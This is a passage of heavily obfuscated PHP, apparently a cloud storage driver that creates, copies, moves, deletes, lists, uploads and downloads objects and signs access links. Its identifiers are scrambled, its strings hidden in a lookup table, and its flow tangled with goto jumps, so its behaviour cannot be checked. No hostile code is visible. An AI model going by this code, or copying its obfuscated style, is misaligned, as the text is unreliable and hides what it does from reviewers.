A­ÁÃÍğêê: } public function mkfile($EØ‹»ŠÑÏ›, $f¬ìÔğÓï = '', $fÖ¬ô¸ê• = REPEAT_RENAME) { if ($this->setContent($EØ‹»ŠÑÏ›, $f¬ìÔğÓï)) { return $this->getPathOuter($EØ‹»ŠÑÏ›); } return !1; } public function mkdir($EÅ±ğ³Úª­, $aÎÄÙã¢È¼ = REPEAT_SKIP) { $F–â±ø¸”ö =& $_SERVER[£¶ä½¶¢]; $Fò“”ß¹ìÕ = trim($EÅ±ğ³Úª­, $F–â±ø¸”ö[18]); if ($this->_isFolder($Fò“”ß¹ìÕ)) { return $this->getPathOuter($Fò“”ß¹ìÕ); } $B¼É’Ú¦“‚ = array($F–â±ø¸”ö[1333]); $BÉù£‚ã‹å = $this->ussRequest($Fò“”ß¹ìÕ, $F–â±ø¸”ö[234], !1, $B¼É’Ú¦“‚); return $BÉù£‚ã‹å[$F–â±ø¸”ö[1084]] ? $this->getPathOuter($Fò“”ß¹ìÕ) : !1; } public function copyFile($C©¢¯Äâˆˆ, $fù¸¹…Ã›§) { $D™˜‡·ºÒÆ =& $_SERVER[£¶ä½¶¢]; $c«õ³ œ®† = array($D™˜‡·ºÒÆ[1334] . "\57{$this->bucket}\57{$C©¢¯Äâˆˆ}", $D™˜‡·ºÒÆ[1335]); $dàù—±¥© = $this->ussRequest($fù¸¹…Ã›§, $D™˜‡·ºÒÆ[236], !1, $c«õ³ œ®†); return $dàù—±¥©[$D™˜‡·ºÒÆ[1084]] ? !0 : $this->getPathOuter($fù¸¹…Ã›§); } public function moveFile($FàÂ’ÓŠ Ú, $cƒÚÌ†…ù) { $d‰æÓÙ÷›¼ =& $_SERVER[£¶ä½¶¢]; $bÇËÜ™˜² = array($d‰æÓÙ÷›¼[1336] . "\57{$this->bucket}\57{$FàÂ’ÓŠ Ú}", $d‰æÓÙ÷›¼[1335]); $c£Íå·ä‹Ç = $this->ussRequest($cƒÚÌ†…ù, $d‰æÓÙ÷›¼[236], !1, $bÇËÜ™˜²); return $c£Íå·ä‹Ç[$d‰æÓÙ÷›¼[1084]] ? !0 : $this->getPathOuter($cƒÚÌ†…ù); } public function delFile($bÅÀìİÜÌé) { $e°“ç¬¤§Ê =& $_SERVER[£¶ä½¶¢]; $Fö¢÷Úõ¯¬ = $this->ussRequest($bÅÀìİÜÌé, $e°“ç¬¤§Ê[1337]); return $Fö¢÷Úõ¯¬[$e°“ç¬¤§Ê[1084]] ? !0 : !1; } public function delFolder($f‡‘·§Ï‚¤) { goto b¢ï†õ–ò; dØ…ãª“³ˆ: $D»İíè ˆ = $fĞ±É©÷·Ä = array(); $this->fileList($f‡‘·§Ï‚¤, $D»İíè ˆ, $fĞ±É©÷·Ä, !0); $this->listItemCache = !0; goto D¹Ğª¿Œ¡š; bÂÂŠ£ö„Â: return $D›©Š‘±Ì¨[$d½Ç©Á—µ¢[1084]]; goto A½ÓÔµÆ‡; D¹Ğª¿Œ¡š: foreach ($fĞ±É©÷·Ä as $BåòöÛ³¯–) { $D›©Š‘±Ì¨ = $this->ussRequest($BåòöÛ³¯–[$d½Ç©Á—µ¢[38]], $d½Ç©Á—µ¢[1337]); if (!$D›©Š‘±Ì¨[$d½Ç©Á—µ¢[1084]]) { return !1; } } foreach ($D»İíè ˆ as $fÑ©â”éâ–) { $D›©Š‘±Ì¨ = $this->ussRequest($fÑ©â”éâ–, $d½Ç©Á—µ¢[1337]); if (!$D›©Š‘±Ì¨[$d½Ç©Á—µ¢[1084]]) { return !1; } } $D›©Š‘±Ì¨ = $this->ussRequest($f‡‘·§Ï‚¤, $d½Ç©Á—µ¢[1337]); goto bÂÂŠ£ö„Â; b¢ï†õ–ò: $d½Ç©Á—µ¢ =& $_SERVER[£¶ä½¶¢]; if (!$this->exist($f‡‘·§Ï‚¤)) { return !0; } $this->listItemCache = !1; goto dØ…ãª“³ˆ; A½ÓÔµÆ‡: } public function rename($D¢¿¹ÎùÊè, $d©¼İ¨‚…³) { if ($this->isFile($D¢¿¹ÎùÊè)) { $d©¼İ¨‚…³ = get_path_father($D¢¿¹ÎùÊè) . $d©¼İ¨‚…³; return $this->moveFile($D¢¿¹ÎùÊè, $d©¼İ¨‚…³); } return $this->renameObject($D¢¿¹ÎùÊè, $d©¼İ¨‚…³); } public function fileInfo($dğßìÓ˜±¬, $fÂ ³¯Ñ¡ = false, $cß¡¥ÅÉƒô = array()) { goto C¢¶Ğ¡Ò…; E©ôÓ‘Îù: $Eœ“”¤´À¥[$C¤™Ÿˆáğ¾[204]] = $Eœ“”¤´À¥[$C¤™Ÿˆáğ¾[94]] = 0; $Eœ“”¤´À¥[$C¤™Ÿˆáğ¾[205]] = $Eœ“”¤´À¥[$C¤™Ÿˆáğ¾[206]] = !0; if (empty($cß¡¥ÅÉƒô)) { $cß¡¥ÅÉƒô = $this->objectMeta($dğßìÓ˜±¬); if (!$cß¡¥ÅÉƒô) { return $Eœ“”¤´À¥; } } goto b£³‘¬‰ä; b£³‘¬‰ä: $Eœ“”¤´À¥[$C¤™Ÿˆáğ¾[204]] = intval($cß¡¥ÅÉƒô[$C¤™Ÿˆáğ¾[1338]]); $Eœ“”¤´À¥[$C¤™Ÿˆáğ¾[94]] = intval($cß¡¥ÅÉƒô[$C¤™Ÿˆáğ¾[1339]]); $Eœ“”¤´À¥[$C¤™Ÿˆáğ¾[88]] = $cß¡¥ÅÉƒô[$C¤™Ÿˆáğ¾[88]]; goto aĞ“«·Ê¬­; aĞ“«·Ê¬­: return $Eœ“”¤´À¥; goto DëÈöŠŸ´â; C¢¶Ğ¡Ò…: $C¤™Ÿˆáğ¾ =& $_SERVER[£¶ä½¶¢]; $Eœ“”¤´À¥ = array($C¤™Ÿˆáğ¾[38] => $this->pathThis($dğßìÓ˜±¬), $C¤™Ÿˆáğ¾[86] => $this->getPathOuter($C¤™Ÿˆáğ¾[18] . $dğßìÓ˜±¬), $C¤™Ÿˆáğ¾[39] => $C¤™Ÿˆáğ¾[203], $C¤™Ÿˆáğ¾[88] => isset($cß¡¥ÅÉƒô[$C¤™Ÿˆáğ¾[88]]) ? $cß¡¥ÅÉƒô[$C¤™Ÿˆáğ¾[88]] : 0, $C¤™Ÿˆáğ¾[178] => $this->ext($dğßìÓ˜±¬)); if ($fÂ ³¯Ñ¡) { return $Eœ“”¤´À¥; } goto E©ôÓ‘Îù; DëÈöŠŸ´â: } public function folderInfo($dÂê™è‹š, $dÁ¿²™ã = false) { goto a˜ä‘Òõ¾Œ; eŸÄ¹òÄ: $cÃÙ•—óÓ¢[$dÜË÷ùÍ[204]] = $cÃÙ•—óÓ¢[$dÜË÷ùÍ[94]] = 0; $cÃÙ•—óÓ¢[$dÜË÷ùÍ[205]] = $cÃÙ•—óÓ¢[$dÜË÷ùÍ[206]] = !0; if (empty($FÛìöÛì)) { $FÛìöÛì = $this->objectMeta($dÂê™è‹š); if (!$FÛìöÛì) { return $cÃÙ•—óÓ¢; } } goto eè£ƒÇõİÑ; eè£ƒÇõİÑ: $cÃÙ•—óÓ¢[$dÜË÷ùÍ[204]] = intval($FÛìöÛì[$dÜË÷ùÍ[1338]]); $cÃÙ•—óÓ¢[$dÜË÷ùÍ[94]] = intval($FÛìöÛì[$dÜË÷ùÍ[1339]]); return $cÃÙ•—óÓ¢; goto c„çšÙŒƒè; a˜ä‘Òõ¾Œ: $dÜË÷ùÍ =& $_SERVER[£¶ä½¶¢]; $cÃÙ•—óÓ¢ = array($dÜË÷ùÍ[38] => $this->pathThis($dÂê™è‹š), $dÜË÷ùÍ[86] => $this->getPathOuter($dÜË÷ùÍ[18] . $dÂê™è‹š), $dÜË÷ùÍ[39] => $dÜË÷ùÍ[87]); if ($dÁ¿²™ã) { return $cÃÙ•—óÓ¢; } goto eŸÄ¹òÄ; c„çšÙŒƒè: } private function listObjs($Dò†•·Ñ¼, $aâ»¤İ¸¿å = 0, $B¿´¶ÒŒİ = 1000) { $E·©‘‡ŠÖ‘ =& $_SERVER[£¶ä½¶¢]; $fË„ÈÉÖÛØ = array($E·©‘‡ŠÖ‘[1340], $E·©‘‡ŠÖ‘[1341] . $B¿´¶ÒŒİ); if ($aâ»¤İ¸¿å) { $fË„ÈÉÖÛØ[] = $E·©‘‡ŠÖ‘[1342] . $aâ»¤İ¸¿å; } $DÂ”Èäî‹ = $this->ussRequest($Dò†•·Ñ¼, $E·©‘‡ŠÖ‘[238], !1, $fË„ÈÉÖÛØ); return !$DÂ”Èäî‹[$E·©‘‡ŠÖ‘[1084]] ? !1 : $DÂ”Èäî‹[$E·©‘‡ŠÖ‘[1086]]; } private function fileList($C¤ĞîŞ¶¾•, &$AÊ¯£Ùà‡…, &$DÂã‡‘Áˆ¥, $Bë¤ìšéØÂ = false) { goto d—Ø¤øÁöÕ; d—Ø¤øÁöÕ: $CÙä˜Ãå†¾ =& $_SERVER[£¶ä½¶¢]; $Cì­Î¤©‹´ = $CÙä˜Ãå†¾[43]; $D‚¨ëªõ–š = 1000; goto Aßµ»”ò‡‘; Aßµ»”ò‡‘: $EÀ–Úâ¸²µ = rtrim($C¤ĞîŞ¶¾•, $CÙä˜Ãå†¾[18]) . $CÙä˜Ãå†¾[18]; $Då¸ŒÙ´“Ù = $this->listItemCache === !1 ? !1 : !0; while (!0) { check_abort(); $C‘áŸœÓõó = $this->listObjs($C¤ĞîŞ¶¾•, $Cì­Î¤©‹´, $D‚¨ëªõ–š); if (!$C‘áŸœÓõó) { return !1; } $Cì­Î¤©‹´ = isset($C‘áŸœÓõó[$CÙä˜Ãå†¾[1343]]) ? $C‘áŸœÓõó[$CÙä˜Ãå†¾[1343]] : $CÙä˜Ãå†¾[43]; $Cø•íÚãÑ = isset($C‘áŸœÓõó[$CÙä˜Ãå†¾[1344]]) ? $C‘áŸœÓõó[$CÙä˜Ãå†¾[1344]] : array(); foreach ($Cø•íÚãÑ as $a“‹ìˆ¤ó) { $Aê‘‘ò‰‡› = $a“‹ìˆ¤ó[$CÙä˜Ãå†¾[39]] == $CÙä˜Ãå†¾[87] ? !0 : !1; $a¥ßİ“ø´Š = ltrim($EÀ–Úâ¸²µ . $a“‹ìˆ¤ó[$CÙä˜Ãå†¾[38]], $CÙä˜Ãå†¾[18]) . ($Aê‘‘ò‰‡› ? $CÙä˜Ãå†¾[18] : $CÙä˜Ãå†¾[43]); $f®¶©¥“Ş½ = array($CÙä˜Ãå†¾[38] => $a¥ßİ“ø´Š, $CÙä˜Ãå†¾[39] => $Aê‘‘ò‰‡› ? $CÙä˜Ãå†¾[87] : $CÙä˜Ãå†¾[203], $CÙä˜Ãå†¾[88] => $a“‹ìˆ¤ó[$CÙä˜Ãå†¾[344]], $CÙä˜Ãå†¾[1339] => $a“‹ìˆ¤ó[$CÙä˜Ãå†¾[1345]]); if ($Då¸ŒÙ´“Ù) { $this->cacheMethod($CÙä˜Ãå†¾[209], $a¥ßİ“ø´Š, $Aê‘‘ò‰‡›); $this->cacheMethod($CÙä˜Ãå†¾[210], $a¥ßİ“ø´Š, $f®¶©¥“Ş½); } if ($Aê‘‘ò‰‡›) { $AÊ¯£Ùà‡…[] = $a¥ßİ“ø´Š; if ($Bë¤ìšéØÂ) { $this->fileList($a¥ßİ“ø´Š, $AÊ¯£Ùà‡…, $DÂã‡‘Áˆ¥, $Bë¤ìšéØÂ); } continue; } $DÂã‡‘Áˆ¥[] = $f®¶©¥“Ş½; } if (count($Cø•íÚãÑ) < $D‚¨ëªõ–š) { break; } } goto Bõâ›«¤ª; Bõâ›«¤ª: if ($Då¸ŒÙ´“Ù) { $this->cacheMethod($CÙä˜Ãå†¾[209], $C¤ĞîŞ¶¾•, !0); } goto F¢ßĞÅŠŒä; F¢ßĞÅŠŒä: } public function listPath($F„ö‚êÕ”Õ, $f¨ĞÉîŞ³ = false) { $D„±ÂŞÖ¢ =& $_SERVER[£¶ä½¶¢]; $bÚíÀÈŸ˜¡ = $AƒÚÒ‹Â•Å = array(); $this->fileList($F„ö‚êÕ”Õ, $bÚíÀÈŸ˜¡, $AƒÚÒ‹Â•Å); foreach ($bÚíÀÈŸ˜¡ as $CË††‘†ã¾ => $Bò¼¼ÉÁ³Â) { $bÚíÀÈŸ˜¡[$CË††‘†ã¾] = $this->folderInfo($Bò¼¼ÉÁ³Â, $f¨ĞÉîŞ³); } foreach ($AƒÚÒ‹Â•Å as $CË††‘†ã¾ => $Bò¼¼ÉÁ³Â) { $AƒÚÒ‹Â•Å[$CË††‘†ã¾] = $this->fileInfo($Bò¼¼ÉÁ³Â[$D„±ÂŞÖ¢[38]], $f¨ĞÉîŞ³, $Bò¼¼ÉÁ³Â); } return array($D„±ÂŞÖ¢[85] => $bÚíÀÈŸ˜¡, $D„±ÂŞÖ¢[84] => $AƒÚÒ‹Â•Å); } public function has($C•İŒéÓ—ˆ, $b÷Ğ™Øƒî = false, $A¤©·øÊç® = true) { goto fø†ÓëÖ; dæ“ì‹š¸: while (!0) { check_abort(); $d–Ÿ‚ÉíÏÊ = $this->listObjs($C•İŒéÓ—ˆ, $DÇš·Ú÷‚Œ, $aÁ˜»œˆÖÄ); if (!$d–Ÿ‚ÉíÏÊ) { return !1; } $DÇš·Ú÷‚Œ = isset($d–Ÿ‚ÉíÏÊ[$a†„İà†ò”[1343]]) ? $d–Ÿ‚ÉíÏÊ[$a†„İà†ò”[1343]] : $a†„İà†ò”[43]; $dÓ¨óƒµÃ¨ = isset($d–Ÿ‚ÉíÏÊ[$a†„İà†ò”[1344]]) ? $d–Ÿ‚ÉíÏÊ[$a†„İà†ò”[1344]] : array(); if (empty($dÓ¨óƒµÃ¨)) { break; } $eÀïßëÓˆ = array_filter($dÓ¨óƒµÃ¨, function ($cöÆÖÏÖ‹†) { $eì‰‰²Â =& $_SERVER[£¶ä½¶¢]; return $cöÆÖÏÖ‹†[$eì‰‰²Â[39]] == $eì‰‰²Â[87]; }); $f‹’©Ç‡šñ = count($dÓ¨óƒµÃ¨); $eÀïßëÓˆ = count($eÀïßëÓˆ); $C©ÚÊÖõ‘› = $f‹’©Ç‡šñ - $eÀïßëÓˆ; if ($b÷Ğ™Øƒî) { $b½– Üˆø += $eÀïßëÓˆ; $C«ÄçîËöÔ += $C©ÚÊÖõ‘›; if ($f‹’©Ç‡šñ < $aÁ˜»œˆÖÄ) { break; } continue; } if ($A¤©·øÊç®) { if ($C©ÚÊÖõ‘›) { return !0; } } else { if ($eÀïßëÓˆ) { return !0; } } if ($f‹’©Ç‡šñ < $aÁ˜»œˆÖÄ) { break; } } if ($b÷Ğ™Øƒî) { return array($a†„İà†ò”[213] => $C«ÄçîËöÔ, $a†„İà†ò”[214] => $b½– Üˆø); } return !1; goto eŸ–ÃİÌØ; fø†ÓëÖ: $a†„İà†ò” =& $_SERVER[£¶ä½¶¢]; $DÇš·Ú÷‚Œ = $a†„İà†ò”[43]; $aÁ˜»œˆÖÄ = 500; goto Cáœàªƒñ„; Cáœàªƒñ„: $C«ÄçîËöÔ = 0; $b½– Üˆø = 0; $fİÈœ¸à¥ = rtrim($C•İŒéÓ—ˆ, $a†„İà†ò”[18]) . $a†„İà†ò”[18]; goto dæ“ì‹š¸; eŸ–ÃİÌØ: } public function listAll($CãÚÑ‚á¸¯) { goto D’“¨©´¤; e¦âîç¿Ñ£: return $this->listAllFiles($CãÚÑ‚á¸¯, array_keys($dÍ³‰¨ÖÎ‚), $dÍ³‰¨ÖÎ‚); goto D¬İğŒáÌ; F‰§ ã³È°: $dÍ³‰¨ÖÎ‚ = array(); foreach ($EˆË‹è¢¯ as $D±ÚÄ²ì£ª) { $dÍ³‰¨ÖÎ‚[$D±ÚÄ²ì£ª[$b¶‚›“µÙµ[38]]] = $D±ÚÄ²ì£ª[$b¶‚›“µÙµ[88]]; } foreach ($Fè¶ÁÂ¢‰ as $D±ÚÄ²ì£ª) { if (is_string($D±ÚÄ²ì£ª)) { $dÍ³‰¨ÖÎ‚[$D±ÚÄ²ì£ª] = 0; } } goto e¦âîç¿Ñ£; D’“¨©´¤: $b¶‚›“µÙµ =& $_SERVER[£¶ä½¶¢]; $Fè¶ÁÂ¢‰ = $EˆË‹è¢¯ = array(); $this->fileList($CãÚÑ‚á¸¯, $Fè¶ÁÂ¢‰, $EˆË‹è¢¯, !0); goto F‰§ ã³È°; D¬İğŒáÌ: } public function canRead($c±è¶Ë‡­‚) { return $this->exist($c±è¶Ë‡­‚) ? !0 : !1; } public function canWrite($E‡óöÔ£ñ) { return $this->exist($E‡óöÔ£ñ) ? !0 : !1; } public function getContent($EƒŠš‚šâ) { return $this->fileSubstr($EƒŠš‚šâ, 0, -1); } public function setContent($E½ˆÇÚ–Œù, $F»¼¬¼‹ = '') { $a¿ Â£ Öê =& $_SERVER[£¶ä½¶¢]; if (!$F»¼¬¼‹) { $EßŒÙ°¾† = $this->ussRequest($E½ˆÇÚ–Œù, $a¿ Â£ Öê[234]); return $EßŒÙ°¾†[$a¿ Â£ Öê[1084]]; } $DÉÌ Ë°Š = $this->tempFile($this->pathThis($E½ˆÇÚ–Œù)); file_put_contents($DÉÌ Ë°Š, $F»¼¬¼‹); if ($this->upload($E½ˆÇÚ–Œù, $DÉÌ Ë°Š)) { $this->tempFileRemve($DÉÌ Ë°Š); return !0; } return !1; } public function fileSubstr($BÈ‹ˆàØÚ, $AÀ„¾Ü¼â, $BÇ»Øà“Î¬) { $c¤¿˜ÎÂ˜ =& $_SERVER[£¶ä½¶¢]; if (!($bÜö†ö­…ù = $this->link($BÈ‹ˆàØÚ))) { return !1; } $fÅ·Ş£ Ã£ = !1; if ($BÇ»Øà“Î¬ > 0) { $d¨Ö•ËÖğ = $AÀ„¾Ü¼â + $BÇ»Øà“Î¬ - 1; $fÅ·Ş£ Ã£ = array($c¤¿˜ÎÂ˜[1306] . $AÀ„¾Ü¼â . $c¤¿˜ÎÂ˜[448] . $d¨Ö•ËÖğ); } $dÂ“£¢”‚ = url_request($bÜö†ö­…ù, $c¤¿˜ÎÂ˜[238], !1, $fÅ·Ş£ Ã£); return $dÂ“£¢”‚[$c¤¿˜ÎÂ˜[718]] ? $dÂ“£¢”‚[$c¤¿˜ÎÂ˜[1086]] : !1; } public function upload($eÀÕ°¤¶˜×, $A©Î²…ìò…, $E‚–áâ´Ñ± = false, $fî”½·öó = REPEAT_REPLACE) { goto b­¡ò‹ó³¥; føçÄâ¿Ûù: do { $eœ§…ÓñÚ½ = $dË‘ñ¤·Ã©[$Cîµ˜Øá’[1352]]; fseek_64($DÛ•Ëƒ®Æœ, $AõËõÃ‰‚‘); $c²”…»¯¤ = fread($DÛ•Ëƒ®Æœ, $eœ§…ÓñÚ½); $D»¬òÓö‡ø = 0; do { $D»¬òÓö‡ø++; $dË‘ñ¤·Ã© = $this->uploadPart($eÀÕ°¤¶˜×, $dË‘ñ¤·Ã©, $c²”…»¯¤); } while (!$dË‘ñ¤·Ã© && $D»¬òÓö‡ø < 3); if (!$dË‘ñ¤·Ã©) { return !1; } $E±’‡‚ìÀ = $dË‘ñ¤·Ã©[$Cîµ˜Øá’[1351]]; $AõËõÃ‰‚‘ += $eœ§…ÓñÚ½; } while ($E±’‡‚ìÀ != -1); fclose($DÛ•Ëƒ®Æœ); $DÏœª“ÜƒË = array($Cîµ˜Øá’[1353], $Cîµ˜Øá’[1354] . $dË‘ñ¤·Ã©[$Cîµ˜Øá’[1355]], $Cîµ˜Øá’[1349]); goto E¥Ù‹“ìİ; c·äÊÕŒ«£: $E±’‡‚ìÀ = $dË‘ñ¤·Ã©[$Cîµ˜Øá’[1351]]; $DÛ•Ëƒ®Æœ = fopen($A©Î²…ìò…, $Cîµ˜Øá’[1256]); if (!$DÛ•Ëƒ®Æœ) { return !1; } goto føçÄâ¿Ûù; e»ÖİĞĞ²ˆ: $E áŸ¥Òï = 1024 * 1024 * 10; $DÏœª“ÜƒË = array($Cîµ˜Øá’[1347], $Cîµ˜Øá’[1348] . $bà£òöØø, $Cîµ˜Øá’[1349], $Cîµ˜Øá’[1350] . $E áŸ¥Òï); $bÍ¹ò¹Ü´Ğ = $this->ussRequest($eÀÕ°¤¶˜×, $Cîµ˜Øá’[236], !1, $DÏœª“ÜƒË); goto fÄÖ„ã¥©; E¥Ù‹“ìİ: $bÍ¹ò¹Ü´Ğ = $this->ussRequest($eÀÕ°¤¶˜×, $Cîµ˜Øá’[236], !1, $DÏœª“ÜƒË); return $bÍ¹ò¹Ü´Ğ[$Cîµ˜Øá’[1084]] ? $this->getPathOuter($a‰òˆœˆµ«) : !1; goto D’‹î·¿‘; fÄÖ„ã¥©: if (!$bÍ¹ò¹Ü´Ğ[$Cîµ˜Øá’[1084]]) { return !1; } $dË‘ñ¤·Ã© = $bÍ¹ò¹Ü´Ğ[$Cîµ˜Øá’[1086]]; $AõËõÃ‰‚‘ = 0; goto c·äÊÕŒ«£; b­¡ò‹ó³¥: $Cîµ˜Øá’ =& $_SERVER[£¶ä½¶¢]; $bà£òöØø = IO::size($A©Î²…ìò…); if ($bà£òöØø <= 1024 * 1024 * 200) { $D‡à½ÃÓé = array($Cîµ˜Øá’[1346] . $A©Î²…ìò…); $bÍ¹ò¹Ü´Ğ = $this->ussRequest($eÀÕ°¤¶˜×, $Cîµ˜Øá’[236], $D‡à½ÃÓé); return $bÍ¹ò¹Ü´Ğ[$Cîµ˜Øá’[1084]] ? $this->getPathOuter($eÀÕ°¤¶˜×) : !1; } goto e»ÖİĞĞ²ˆ; D’‹î·¿‘: } private function uploadPart($D°êÏÂƒåñ, $DôÙÅÌˆˆ, &$DİÔÉª”­Ë) { $E‡‘ñ”‚·• =& $_SERVER[£¶ä½¶¢]; $bÍ”™»¶„‹ = array($E‡‘ñ”‚·•[1356], $E‡‘ñ”‚·•[1354] . $DôÙÅÌˆˆ[$E‡‘ñ”‚·•[1355]], $E‡‘ñ”‚·•[1357] . $DôÙÅÌˆˆ[$E‡‘ñ”‚·•[1351]], $E‡‘ñ”‚·•[151] . $DôÙÅÌˆˆ[$E‡‘ñ”‚·•[1352]]); $fÏßŞ‰‡Øê = $this->ussRequest($D°êÏÂƒåñ, $E‡‘ñ”‚·•[236], $DİÔÉª”­Ë, $bÍ”™»¶„‹); return !$fÏßŞ‰‡Øê[$E‡‘ñ”‚·•[1084]] ? $fÏßŞ‰‡Øê[$E‡‘ñ”‚·•[1084]] : $fÏßŞ‰‡Øê[$E‡‘ñ”‚·•[1086]]; } public function uploadFormData($B¶ªÓ‘®‹, $EÖŒÔ•¹Š = 3600) { return $this->uploadPolicy($B¶ªÓ‘®‹, $EÖŒÔ•¹Š); } public function multiUploadFormData($FäªªØ¿é, $eƒ„ò“ÅÒô = 3600) { $Dšõƒšâ°å =& $_SERVER[£¶ä½¶¢]; $AõÖ¿ŒšµË = (int) $GLOBALS[$Dšõƒšâ°å[17]][$Dšõƒšâ°å[88]]; return $this->uploadPolicy($FäªªØ¿é, $eƒ„ò“ÅÒô, $AõÖ¿ŒšµË); } private function uploadPolicy($CÚ¢àÚÇ«‹, $A¦ŒëÇîØ = 3600, $A‘›¼½‘š = 0) { goto bŠÎéµÂõì; bŠÎéµÂõì: $F×š¬·ß«Â =& $_SERVER[£¶ä½¶¢]; $fó¦Ÿˆ‡ Ş = $F×š¬·ß«Â[18] . $this->bucket; $DÁÎáÃÛø = gmdate($F×š¬·ß«Â[1293]); goto BÍŒ²ÇŞÚ; Cªî‰‡ ¼‹: $dÎªöÜÃ‰ğ = base64_encode(hash_hmac($F×š¬·ß«Â[1328], "\x50\x4f\123\124\x26{$fó¦Ÿˆ‡ Ş}\x26{$DÁÎáÃÛø}\x26{$bè½¸é½°ô}", md5("{$this->userpass}"), !0)); $aö­À¿ìÚÄ = array($F×š¬·ß«Â[1198] => $bè½¸é½°ô, $F×š¬·ß«Â[1362] => "\125\120\x59\x55\x4e\40{$this->username}\72{$dÎªöÜÃ‰ğ}", $F×š¬·ß«Â[185] => $this->endpoint . $fó¦Ÿˆ‡ Ş); return $aö­À¿ìÚÄ; goto bÔØéÓÃ­á; BÍŒ²ÇŞÚ: $eáÔ¬îÂ± = array($F×š¬·ß«Â[1358] => $this->bucket, $F×š¬·ß«Â[1359] => $CÚ¢àÚÇ«‹, $F×š¬·ß«Â[1360] => time() + $A¦ŒëÇîØ, $F×š¬·ß«Â[1361] => $DÁÎáÃÛø); if ($A‘›¼½‘š) { $eáÔ¬îÂ±[$F×š¬·ß«Â[1272]] = $A‘›¼½‘š; } $bè½¸é½°ô = base64_encode(json_encode($eáÔ¬îÂ±)); goto Cªî‰‡ ¼‹; bÔØéÓÃ­á: } public function download($a·ÛİÓâà, $D¹‡É¸¥¥ä) { goto aùèä±‡Ï…; CœÅ£³ºÖÖ: $c èæŞÖĞ‚ = 1024 * 200; $Aæñ‹äÙÄ = fopen($có¯ºëÚÈí, $_SERVER[£¶ä½¶¢][1312]); while (!0) { $A¹ç»—§Ø = $this->fileSubstr($a·ÛİÓâà, $EŠò—Øí¿Š, $c èæŞÖĞ‚); if ($A¹ç»—§Ø === !1) { return !1; } fwrite($Aæñ‹äÙÄ, $A¹ç»—§Ø); $EŠò—Øí¿Š += $c èæŞÖĞ‚; if (strlen($A¹ç»—§Ø) < $c èæŞÖĞ‚) { break; } } goto b‡¡Î¢›Æ¿; b‡¡Î¢›Æ¿: fclose($Aæñ‹äÙÄ); return $D¹‡É¸¥¥ä; goto C ¶¬ÊÊåì; aùèä±‡Ï…: $có¯ºëÚÈí = IO::getPathInner(IO::mkfile($D¹‡É¸¥¥ä)); if (!($fÇŸèË±Ş— = $this->link($a·ÛİÓâà))) { return !1; } $EŠò—Øí¿Š = 0; goto CœÅ£³ºÖÖ; C ¶¬ÊÊåì: } public function link($Aß±æ¨ƒÃä, $B­ª”ôÕæô = array()) { $e»Õ–®Œ =& $_SERVER[£¶ä½¶¢]; $Aß±æ¨ƒÃä = trim($Aß±æ¨ƒÃä, $e»Õ–®Œ[18]); if (!empty($this->token)) { $fîÁ³ÓÑ = strtotime(date($e»Õ–®Œ[1363])); $dÊÆä‰‚¹‚ = substr(md5($this->token . $e»Õ–®Œ[291] . $fîÁ³ÓÑ . $e»Õ–®Œ[1364] . $Aß±æ¨ƒÃä), 12, 8) . $fîÁ³ÓÑ; $B­ª”ôÕæô[] = $e»Õ–®Œ[1365] . $dÊÆä‰‚¹‚; } $aÃ‘¢ªÂ›“ = !empty($B­ª”ôÕæô) ? $e»Õ–®Œ[80] . implode($e»Õ–®Œ[291], $B­ª”ôÕæô) : $e»Õ–®Œ[43]; return $this->getHost() . $e»Õ–®Œ[18] . $Aß±æ¨ƒÃä . $aÃ‘¢ªÂ›“; } public function fileOut($A­øÌª·ºã, $f‹±†Ä°“Ê = false, $C¶¥ÇŞÏ´ = false, $dÍØ‘¡¸Çá = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($A­øÌª·ºã, $f‹±†Ä°“Ê, $C¶¥ÇŞÏ´, $dÍØ‘¡¸Çá); } if (!$C¶¥ÇŞÏ´) { $C¶¥ÇŞÏ´ = $this->pathThis($A­øÌª·ºã); } $BØ“ËÜ¹“’ = $f‹±†Ä°“Ê ? array($_SERVER[£¶ä½¶¢][1366] . rawurlencode($C¶¥ÇŞÏ´)) : array(); $cËÃ÷ÜÄ¿ = $this->link($A­øÌª·ºã, $BØ“ËÜ¹“’); $this->fileOutLink($cËÃ÷ÜÄ¿); } public function fileOutServer($f­Ó–ãÇ‡”, $B‘»š¯“¦ = false, $FÎœºîîñÉ = false, $B‘ÍîÕ¤Èİ = '') { parent::fileOut($f­Ó–ãÇ‡”, $B‘»š¯“¦, $FÎœºîîñÉ, $B‘ÍîÕ¤Èİ); } public function fileOutImage($a™Â’¯ÆÖÈ, $e·¥Û¶Ã‹± = 250) { $eÈ˜ÒîèÃ¸ = $this->link($a™Â’¯ÆÖÈ . $_SERVER[£¶ä½¶¢][1367] . $e·¥Û¶Ã‹±); $this->fileOutLink($eÈ˜ÒîèÃ¸); } public function fileOutImageServer($bà³÷‹‰§, $dòä”ì¼ƒ´ = 250) { parent::fileOutImage($bà³÷‹‰§, $dòä”ì¼ƒ´); } public function hashMd5($FÖæ•¼‹­ï) { $CËËºï™“Ø =& $_SERVER[£¶ä½¶¢]; $Aóƒ¢ïœæ = $this->_objectMeta($FÖæ•¼‹­ï); return isset($Aóƒ¢ïœæ[$CËËºï™“Ø[218]]) ? $Aóƒ¢ïœæ[$CËËºï™“Ø[218]] : !1; } public function size($bùÉ½ó•ï) { $b³í¸‰Œä = $this->objectMeta($bùÉ½ó•ï); return $b³í¸‰Œä ? $b³í¸‰Œä[$_SERVER[£¶ä½¶¢][88]] : 0; } public function info($B»¡ËèËàò) { if ($this->isFolder($B»¡ËèËàò)) { return $this->folderInfo($B»¡ËèËàò); } else { if ($this->isFile($B»¡ËèËàò)) { return $this->fileInfo($B»¡ËèËàò); } } return !1; } public function exist($eÜîÛÒ¤ÔŸ) { return $this->isFile($eÜîÛÒ¤ÔŸ) || $this->isFolder($eÜîÛÒ¤ÔŸ); } public function isFile($B‹ÍˆœŒ) { return !$this->isFolder($B‹ÍˆœŒ) && $this->objectMeta($B‹ÍˆœŒ); } public function isFolder($Aİ®ì²Ş—ƒ) { return $this->cacheMethod($_SERVER[£¶ä½¶¢][209], $Aİ®ì²Ş—ƒ); } protected function objectMeta($Aêµ¸¡¬’½) { return $this->cacheMethod($_SERVER[£¶ä½¶¢][210], $Aêµ¸¡¬’½); } protected function _objectMeta($càä¯’Ê‹‚) { goto c‘Êª‘½ƒ‡; b²©çäˆçî: $A²Ê“ÀŒö = array($AÎé‚÷Ğ›Ç[39] => isset($a×†Ü…˜ÂÄ[$AÎé‚÷Ğ›Ç[1369]]) ? $a×†Ü…˜ÂÄ[$AÎé‚÷Ğ›Ç[1369]] : null, 